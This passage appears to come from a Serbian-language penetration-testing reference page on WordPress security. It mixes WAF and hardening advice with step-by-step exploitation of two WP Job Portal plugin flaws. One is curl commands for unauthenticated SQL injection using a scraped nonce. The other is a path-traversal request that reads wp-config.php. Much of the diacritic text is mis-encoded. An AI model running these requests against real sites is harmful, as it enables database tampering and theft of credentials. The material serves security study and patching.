### Razmatranja WAF-a za WordPress/plugin CVE-ove

Generiƒçki edge/server WAF-ovi su pode≈°eni za ≈°iroke obrasce (SQLi, XSS, LFI). Mnoge visokoriziƒçne WordPress/plugin ranjivosti su gre≈°ke specifiƒçne za aplikacionu logiku ili autorizaciju koje izgledaju kao benigni saobraƒáaj, osim ako mehanizam ne razume WordPress rute i semantiku plugina.

Ofanzivne napomene

- Ciljajte endpoint-e specifiƒçne za plugin sa ƒçistim payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Prvo testirajte neautentifikovane puteve (AJAX `nopriv`, REST sa permisivnim `permission_callback`, public shortcodes). Default payloads ƒçesto uspevaju bez obfuskacije.
- Tipiƒçni sluƒçajevi visokog uticaja: eskalacija privilegija (broken access control), arbitrary file upload/download, LFI, open redirect.

Odbrambene napomene

- Nemojte se oslanjati na generiƒçke WAF potpise da ≈°tite plugin CVE-ove. Implementirajte application-layer, vulnerability-specific virtual patches ili a≈æurirajte brzo.
- Preferirajte positive-security provere u kodu (capabilities, nonces, strict input validation) umesto negativnih regex filtera.

## Za≈°tita WordPress-a

### Redovna a≈æuriranja

Uverite se da su WordPress, plugins, i teme a≈æurirani. Takoƒëe potvrdite da je automatsko a≈æuriranje omoguƒáeno u wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Takoƒëe, **instalirajte samo pouzdane WordPress plugine i teme**.

### Sigurnosni dodaci

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Ostale preporuke**

- Uklonite podrazumevanog **admin** korisnika
- Koristite **jake lozinke** i **2FA**
- Periodiƒçno **pregledajte** **dozvole** korisnika
- **Ograniƒçite poku≈°aje prijave** da spreƒçite Brute Force napade
- Preimenujte fajl **`wp-admin.php`** i dozvolite pristup samo interno ili sa odreƒëenih IP adresa.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin izlo≈æio je zadatak **savecategory** koji na kraju izvr≈°ava sledeƒái ranjivi kod unutar `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemi uvedeni ovim isjeƒçkom:

1. **Nesanitizovan korisniƒçki unos** ‚Äì `parentid` dolazi direktno iz HTTP zahteva.
2. **Konkatenacija stringova u WHERE klauzuli** ‚Äì nema `is_numeric()` / `esc_sql()` / prepared statement.
3. **Moguƒánost pristupa bez autentikacije** ‚Äì iako se akcija izvr≈°ava preko `admin-post.php`, jedina provera je **CSRF nonce** (`wp_verify_nonce()`), koju bilo koji posetilac mo≈æe preuzeti sa javne stranice koja sadr≈æi shortcode `[wpjobportal_my_resumes]`.

#### Eksploatacija

1. Preuzmite sve≈æ nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injektujte proizvoljan SQL zloupotrebom `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Odgovor otkriva rezultat injektovanog upita ili menja bazu podataka, dokazujuƒái SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Jo≈° jedan zadatak, **downloadcustomfile**, omoguƒáavao je posetiocima da preuzmu **bilo koju datoteku na disku** putem path traversal. Ranjivi sink se nalazi u `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` je kontrolisan od strane napadaƒça i spojen **bez sanitizacije**.  Opet, jedino ograniƒçenje je **CSRF nonce** koji se mo≈æe dobiti sa stranice rezimea.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Server vraƒáa sadr≈æaj `wp-config.php`, leaking DB credentials i auth keys.

## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
